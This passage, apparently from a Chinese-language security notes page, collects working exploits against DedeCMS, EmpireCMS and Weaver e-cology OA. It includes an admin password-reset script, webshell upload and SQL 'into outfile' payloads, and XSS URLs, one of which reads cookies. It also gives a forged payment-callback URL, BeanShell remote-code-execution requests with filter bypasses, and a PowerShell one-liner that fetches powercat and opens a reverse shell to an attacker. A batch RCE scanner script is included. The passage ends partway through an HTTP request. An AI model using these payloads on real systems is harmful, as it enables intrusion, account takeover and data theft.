+    vdcode <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"Please enter the verification code : "</span><span class="token punctuation">)</span>
+
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"dopost"</span><span class="token punctuation">:</span> <span class="token string">"save"</span><span class="token punctuation">,</span> <span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"oldpwd"</span><span class="token punctuation">:</span> oldpwd<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> newpwd<span class="token punctuation">,</span> <span class="token string">"userpwdok"</span><span class="token punctuation">:</span> newpwd<span class="token punctuation">,</span>
+            <span class="token string">"safequestion"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"newsafequestion"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"sex"</span><span class="token punctuation">:</span> <span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">,</span> <span class="token string">"vdcode"</span><span class="token punctuation">:</span> vdcode<span class="token punctuation">&#125;</span>
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">'/member/edit_baseinfo.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"成功更新你的基本资料"</span> <span class="token keyword">in</span>  rs<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+       <span class="token keyword">print</span> <span class="token string">"Administrator password modified successfully !!"</span>
+       <span class="token keyword">print</span> <span class="token string">"The new administrator password is : "</span> <span class="token operator">+</span> newpwd
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"attack fail"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h1><hr>
+<h1 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h1><hr>
+<h1 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h1><hr>
+<h1 id="ECShop"><a href="#ECShop" class="headerlink" title="ECShop"></a>ECShop</h1><hr>
+<h1 id="EmpireCMS"><a href="#EmpireCMS" class="headerlink" title="EmpireCMS"></a>EmpireCMS</h1><h2 id="（CVE-2018-18086）EmpireCMS-7-5-后台getshell"><a href="#（CVE-2018-18086）EmpireCMS-7-5-后台getshell" class="headerlink" title="（CVE-2018-18086）EmpireCMS 7.5 后台getshell"></a>（CVE-2018-18086）EmpireCMS 7.5 后台getshell</h2><p>查看<code>/e/admin/ecmsmod.php</code>代码</p>
+<p>跟随<code>LoadInMod</code>函数来到<code>/e/class/moddofun.php</code>,可以看到上传文件处使用<code>make_password(10)</code>对时间进行加密然后拼接成为上传的文件名,这样就无法得到用户名</p>
+<p>继续浏览代码,在下面发现<code>@include($path)</code>,直接包含了这个上传的文件,这时如果在上传文件中添加可以创建文件的代码就可以绕过找不到文件名这个限制了。</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span>“shell<span class="token operator">.</span>php”<span class="token punctuation">,</span>”<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>”); ?><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>登录后台</p>
+<p>点击”导入系统模型”</p>
+<p>可以上传一个内容为php代码的<code>.mod</code>后缀的文件</p>
+<p>上传<code>1.php.mod</code>文件</p>
+<p>浏览访问<code>http://www.0-sec.org/e/admin/shell.php</code>,可以看到成功执行代码</p>
+<p>上传一个内容可以getshell的<code>1.php.mod</code>,内容入下:注意需要对<code>$</code>进行转义</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                                                        <span class="token delimiter important">?></span></span>");?><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上传后蚁剑连接即可</p>
+<hr>
+<h2 id="（CVE-2018-19462）EmpireCMS-7-5-admindbDoSql-php代码注入漏洞"><a href="#（CVE-2018-19462）EmpireCMS-7-5-admindbDoSql-php代码注入漏洞" class="headerlink" title="（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞"></a>（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞</h2><blockquote>
+<p>EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p>
+</blockquote>
+<p>分析源码定位漏洞出现的位置在&#x2F;e&#x2F;admin&#x2F;db&#x2F;DoSql.php,浏览代码,对sqltext使用RepSqlTbpre函数进行处理</p>
+<p>跟进RepSqlTbpre函数,发现仅仅对表的前缀做替换,没有做其他任何处理</p>
+<p>继续浏览代码,发现对$query使用DoRunQuery函数进行处理</p>
+<p>跟进DoRunQuery函数,可以看到对$sql参数只做了去除空格、以”;”分隔然后遍历,并你没有做别的限制和过滤,导致可以执行恶意的sql语句</p>
+<p>登录后台，payload：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[1])?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:/phpStudy/WWW/empirecms/shell.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>点击”执行SQL”,提示错误,是由于mysql安全限制的原因</p>
+<p>修改mysql的配置文件, 在[mysqld] 下添加条目: secure_file_priv &#x3D;,保存之后,然后重启mysql</p>
+<p>再次执行SQL语句,可以看到成功执行SQL语句</p>
+<hr>
+<h2 id="EmpireCMS-6-0-搜索框xss"><a href="#EmpireCMS-6-0-搜索框xss" class="headerlink" title="EmpireCMS 6.0 搜索框xss"></a>EmpireCMS 6.0 搜索框xss</h2><p>payload：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">-</span>sec<span class="token punctuation">.</span>org<span class="token operator">/</span>search<span class="token operator">/</span>keyword<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>allsame<span class="token operator">=</span><span class="token number">3</span>"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">zerosec</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="EmpireCMS-6-6-7-2-路径泄漏"><a href="#EmpireCMS-6-6-7-2-路径泄漏" class="headerlink" title="EmpireCMS 6.6-7.2 路径泄漏"></a>EmpireCMS 6.6-7.2 路径泄漏</h2><p>poc：</p>
+<p>6.6</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/admin/tool/ShowPic.php?url[]=kongxin&amp;pic_height[]=kongxin&amp;pic_width[]=kongxin&amp;picurl[]=kongxin&amp; </span>
+
+http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/action/ListInfo.php?totalnum[]=kongxin&amp;page[]=kongxin&amp;myorder[]=kongxin&amp;orderby[]=kongxin&amp;andor[]=kongxin&amp;ph[]=kongxin&amp;tempid[]=kongxin&amp;line[]=kongxin&amp;endtime[]=kongxin&amp;starttime[]=kongxin&amp;ztid[]=kongxin&amp;ttid[]=kongxin&amp;classid[]=kongxin&amp;mid[]=kongxin&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>7.0</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&amp;sinfo[]=kongxin&amp;modtype[]=kongxin&amp;infoid[]=kongxin&amp;filepass[]=kongxin&amp;classid[]=kongxin&amp;showmod[]=kongxin&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>7.2</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&amp;fname[]=kongxin&amp;InstanceName[]=kongxin&amp;filepass[]=kongxin&amp;classid[]=kongxin&amp;type[]=kongxin&amp;showmod[]=kongxin&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="EmpireCMS-7-5-前台xss"><a href="#EmpireCMS-7-5-前台xss" class="headerlink" title="EmpireCMS 7.5 前台xss"></a>EmpireCMS 7.5 前台xss</h2><blockquote>
+<p>该漏洞是由于javascript获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p>
+</blockquote>
+<p>利用条件：需要开启会员空间功能，登录后台开启会员空间功能</p>
+<p>payload：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">-</span>sec<span class="token punctuation">.</span>org<span class="token operator">/</span>e<span class="token operator">/</span>ViewImg<span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token operator">?</span>url<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>点击图片便可触发</p>
+<hr>
+<h2 id="EmpireCMS-7-5-后台xss"><a href="#EmpireCMS-7-5-后台xss" class="headerlink" title="EmpireCMS 7.5 后台xss"></a>EmpireCMS 7.5 后台xss</h2><blockquote>
+<p>该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理,但是没有对任何恶意关键字进行过滤,从而导致攻击者使用别的关键字进行攻击。</p>
+</blockquote>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(/xss/)</span>
+http<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(document.cookie)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="EmpireCMS-7-5-后台任意代码执行漏洞"><a href="#EmpireCMS-7-5-后台任意代码执行漏洞" class="headerlink" title="EmpireCMS 7.5 后台任意代码执行漏洞"></a>EmpireCMS 7.5 后台任意代码执行漏洞</h2><p>漏洞代码发生在后台数据备份处代码&#x2F;e&#x2F;admin&#x2F;ebak&#x2F;ChangeTable.php 44行附近，通过审计发现执行备份时，对表名的处理程序是value&#x3D;”” 通过php短标签形式直接赋值给tablename[]。</p>
+<p>进行备份时未对数据库表名做验证，导致任意代码执行。</p>
+<p>poc：</p>
+<p>点击”开始备份”,burp抓包,修改tablename参数的值</p>
+<p>可以看到响应的数据包,成功备份</p>
+<p>查看备份的文件，访问备份目录下的config.php,可以看到成功执行phpinfo,这时查看config.php文件</p>
+<hr>
+<h2 id="EmpireCMS-7-5-配置文件写入漏洞"><a href="#EmpireCMS-7-5-配置文件写入漏洞" class="headerlink" title="EmpireCMS 7.5 配置文件写入漏洞"></a>EmpireCMS 7.5 配置文件写入漏洞</h2><blockquote>
+<p>该漏洞是由于安装程序时没有对用户的输入做严格过滤,导致用户输入的可控参数被写入配置文件,造成任意代码执行漏洞。</p>
+</blockquote>
+<p>在代码位置&#x2F;e&#x2F;install&#x2F;data&#x2F;fun.php 347~379行发现，将用户前端输入的表前缀（默认phome_）替换掉默认的phome_后带入了sql语句中进行表的创建，并且可以发现过程中未作过滤。</p>
+<p>创建表的同时将配置数据包含可控的表前缀一起写入到config.php配置文件，代码位置&#x2F;e&#x2F;install&#x2F;data&#x2F;fun.php 587~645行</p>
+<p>整个install过程中并未对用户数据进行过滤，导致配置文件代码写入。</p>
+<hr>
+<h2 id="EmpireCMS-任意充值漏洞"><a href="#EmpireCMS-任意充值漏洞" class="headerlink" title="EmpireCMS 任意充值漏洞"></a>EmpireCMS 任意充值漏洞</h2><p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment">//www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php?sign=63b90f066d744a4d53150045837bd90d&amp;trade_status=TRADE_FINISHED&amp;trade_no=1111&amp;out_trade_no=aaaaaa&amp;total_fee=11111111</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>sign=63b90f066d744a4d53150045837bd90d</code>是get的数组的md5值</p>
+<hr>
+<h1 id="Eyoucms"><a href="#Eyoucms" class="headerlink" title="Eyoucms"></a>Eyoucms</h1><hr>
+<h1 id="FastAdmin"><a href="#FastAdmin" class="headerlink" title="FastAdmin"></a>FastAdmin</h1><hr>
+<h1 id="泛微OA"><a href="#泛微OA" class="headerlink" title="泛微OA"></a>泛微OA</h1><p>一把梭exp：<a target="_blank" rel="noopener" href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a></p>
+<h2 id="泛微OA-E-cology远程代码执行漏洞（CNVD-2019-32204）"><a href="#泛微OA-E-cology远程代码执行漏洞（CNVD-2019-32204）" class="headerlink" title="泛微OA E-cology远程代码执行漏洞（CNVD-2019-32204）"></a>泛微OA E-cology远程代码执行漏洞（CNVD-2019-32204）</h2><p>版本：e-cology &lt;&#x3D;9.0</p>
+<p>指纹：<code>Set-Cookie: ecology_JSessionId=</code></p>
+<p>路由：<code>/weaver/bsh.servlet.BshServlet</code></p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/weaver/bsh.servlet.BshServlet</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.0-sec.org:8088</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">98</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+
+bsh.script=eval%00("ex"%2b"ec("whoami")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用技巧：</p>
+<ol>
+<li><p>绕过：<code>eval%00(&quot;ex&quot;%2b&quot;ec(&quot;whoami&quot;)&quot;);</code> 也可以换成 <code>ex\u0065c(&quot;cmd /c dir&quot;);</code></p>
+</li>
+<li><p>泛微多数都是windows环境, 反弹shell可以使用pcat</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip <span class="token operator">-</span>p 6666 <span class="token operator">-</span>e cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#1.install python Dependencies Library </span>
+<span class="token comment">#pip install requests</span>
+<span class="token comment">#2.批量脚本 执行 </span>
+<span class="token comment">#python Weaver-Ecology-OA_RCE-exp.py </span>
+<span class="token comment">#url.txt文件中 是url地址 需要带http协议</span>
+
+<span class="token comment">#/usr/bin/python</span>
+<span class="token comment">#coding:utf-8</span>
+<span class="token comment">#Author:Ja0k</span>
+<span class="token comment">#For Weaver-Ecology-OA_RCE</span>
+
+<span class="token keyword">import</span> urllib3
+urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>
+
+<span class="token keyword">import</span> requests<span class="token punctuation">,</span>sys
+
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml; charset=utf-8'</span><span class="token punctuation">,</span>
+    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'</span><span class="token punctuation">,</span>
+    <span class="token string">'Cache-Control'</span><span class="token punctuation">:</span> <span class="token string">'max-age=0'</span><span class="token punctuation">,</span>
+    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
+    <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
+    <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'578'</span>
+<span class="token punctuation">&#125;</span>
+
+proxies<span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">Poc_check</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    Url_Payload1<span class="token operator">=</span><span class="token string">"/bsh.servlet.BshServlet"</span>
+    Url_Payload2<span class="token operator">=</span><span class="token string">"/weaver/bsh.servlet.BshServlet"</span>
+    Url_Payload3<span class="token operator">=</span><span class="token string">"/weaveroa/bsh.servlet.BshServlet"</span>
+    Url_Payload4<span class="token operator">=</span><span class="token string">"/oa/bsh.servlet.BshServlet"</span>
+
+    Data_Payload1<span class="token operator">=</span><span class="token triple-quoted-string string">"""bsh.script=exec("whoami");&amp;bsh.servlet.output=raw"""</span>
+    Data_Payload2<span class="token operator">=</span> <span class="token triple-quoted-string string">"""bsh.script=\u0065\u0078\u0065\u0063("whoami");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw"""</span>
+    Data_Payload3<span class="token operator">=</span> <span class="token triple-quoted-string string">"""bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter("command"))");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami"""</span>
+    <span class="token keyword">for</span> Url_Payload <span class="token keyword">in</span> <span class="token punctuation">(</span>Url_Payload1<span class="token punctuation">,</span>Url_Payload2<span class="token punctuation">,</span>Url_Payload3<span class="token punctuation">,</span>Url_Payload4<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        url<span class="token operator">=</span> target <span class="token operator">+</span> Url_Payload
+        <span class="token keyword">for</span> Data_payload <span class="token keyword">in</span> <span class="token punctuation">(</span>Data_Payload1<span class="token punctuation">,</span>Data_Payload2<span class="token punctuation">,</span>Data_Payload3<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                http_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>Data_payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+                <span class="token comment">#print http_response.status_code</span>
+                <span class="token keyword">if</span> http_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+                    <span class="token keyword">if</span> <span class="token string">";&lt;/script>"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">if</span> <span class="token string">"Login.jsp"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                            <span class="token keyword">if</span> <span class="token string">"Error"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                                <span class="token keyword">print</span> <span class="token string">"&#123;0&#125; is a E-cologyOA_RCE Vulnerability"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+                                <span class="token keyword">print</span> <span class="token string">"Server Current Username：&#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
+                <span class="token keyword">elif</span> http_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
+                    <span class="token keyword">print</span> <span class="token string">"&#123;0&#125;500 maybe is Weaver-EcologyOA，Please confirm by yourself "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                    <span class="token keyword">pass</span>              
+            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>Error<span class="token punctuation">:</span>
+                <span class="token keyword">pass</span>    
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        target<span class="token operator">=</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        Poc_check<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="泛微OA-数据库配置文件读取"><a href="#泛微OA-数据库配置文件读取" class="headerlink" title="泛微OA 数据库配置文件读取"></a>泛微OA 数据库配置文件读取</h2><p>exp：<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/ecologyExp.jar">https://github.com/ianxtianxt/ecologyExp.jar</a></p>
+<p>使用方法：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ecologyExp.jar http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="泛微OA-管理系统RCE漏洞"><a href="#泛微OA-管理系统RCE漏洞" class="headerlink" title="泛微OA 管理系统RCE漏洞"></a>泛微OA 管理系统RCE漏洞</h2><p>poc：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://0-sec.org:8000/weaver/bsh.servlet.BshServlet <span class="token parameter variable">-d</span> 'bsh.script<span class="token operator">=</span>eval%00<span class="token punctuation">(</span><span class="token string">"ex"</span>%2b<span class="token string">"ec("</span><span class="token function">whoami</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token assign-left variable">bsh.servlet.captureOutErr</span><span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">bsh.servlet.output</span><span class="token operator">=</span>raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>好像和前面 ecology 一样</p>
+<hr>
+<h2 id="WorkflowCenterTreeData-接口注入漏洞"><a href="#WorkflowCenterTreeData-接口注入漏洞" class="headerlink" title="WorkflowCenterTreeData 接口注入漏洞"></a>WorkflowCenterTreeData 接口注入漏洞</h2><p>环境：限oracle数据库</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">ip:port</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2236</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1 </span></span>
+
